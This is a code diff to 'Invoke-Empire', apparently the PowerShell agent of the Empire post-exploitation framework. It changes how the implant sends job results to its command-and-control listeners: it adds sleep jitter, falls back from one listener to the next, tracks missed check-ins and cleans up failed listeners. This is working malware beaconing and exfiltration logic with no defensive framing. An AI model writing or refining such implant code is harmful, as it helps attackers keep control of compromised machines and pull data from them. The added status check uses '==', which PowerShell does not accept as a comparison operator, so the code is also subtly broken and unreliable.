@@ -772,11 +772,17 @@ function Invoke-Empire {
 	# send message function iterating through listeners
 	$script:SendMessage = {
 		param($Packets)
-		foreach ($Listener in $script:listeners){
-			SleepWithJitter($l)	
-			if ($JobResults) {
-				((& $Listener["send_func"] -Packets $Packets -FixedParameters $Listener["fixed_parameters"]))
+		if ($JobResults) {
+			foreach ($Listener in $script:listeners){
+				SleepWithJitter($Listener)	
+				$response = (& $Listener["send_func"] -Packets $Packets -FixedParameters $Listener["fixed_parameters"])
+				if ([int]$response.StatusCode == 200){#a message got through
+					$Listener["missedCheckins"] = 0
+					break
+				}
+				$Listener["missedCheckins"] += 1
 			}
+			(& $script:CleanUpListeners)
 		}
 	}
 
